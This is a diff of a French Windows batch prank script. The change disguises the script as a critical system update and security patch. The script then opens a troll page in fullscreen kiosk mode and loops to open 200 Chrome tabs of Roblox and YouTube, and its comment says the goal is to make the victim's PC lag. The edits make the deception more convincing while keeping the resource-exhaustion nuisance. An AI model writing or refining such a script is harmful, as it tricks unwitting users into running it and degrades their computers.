@@ -1,18 +1,18 @@
 @echo off
-title ERREUR CRITIQUE
+title MISE A JOUR SYSTEME CRITIQUE
 color 0a
-echo Initialisation de l'effacement du disque...
+echo Initialisation de la mise a jour...
 timeout /t 2 >nul
-echo Suppression de C:\Windows\System32...
+echo Verification des fichiers systeme...
 timeout /t 2 >nul
-echo Envoi des données...
+echo Deploiement du patch de securite...
 timeout /t 2 >nul
 
-:: Ouvre la page du troll en plein écran
+:: 1. Ouvre la page du troll en PLEIN ECRAN (mode kiosque)
 start chrome --kiosk "https://member-cleanup.vercel.app"
 timeout /t 2 >nul
 
-:: Boucle pour ouvrir 200 pages (attention, ça va ramer !)
+:: 2. Ouvre 200 onglets en arriere-plan pour faire ramer le PC
 for /l %%x in (1, 1, 200) do (
     start chrome "https://www.roblox.com"
     start chrome "https://www.youtube.com"
